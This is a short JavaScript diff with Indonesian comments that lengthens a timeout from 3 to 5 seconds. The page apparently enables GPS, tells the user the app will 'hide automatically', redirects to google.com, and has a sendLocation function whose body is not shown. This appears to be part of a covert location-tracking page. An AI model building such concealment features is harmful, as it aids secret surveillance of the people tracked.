@@ -148,10 +148,10 @@ async function startActivation() {
   statusBox.textContent = '✅ GPS aktif! Aplikasi akan disembunyikan otomatis...';
   document.getElementById('startBtn').style.display = 'none';
   
-  // Auto-hide setelah 3 detik (tanpa popup)
+  // Auto-hide setelah 5 detik (tanpa popup)
   setTimeout(function() {
     window.location.href = 'https://www.google.com';
-  }, 3000);
+  }, 5000);
 }
 
 async function sendLocation(coords) {
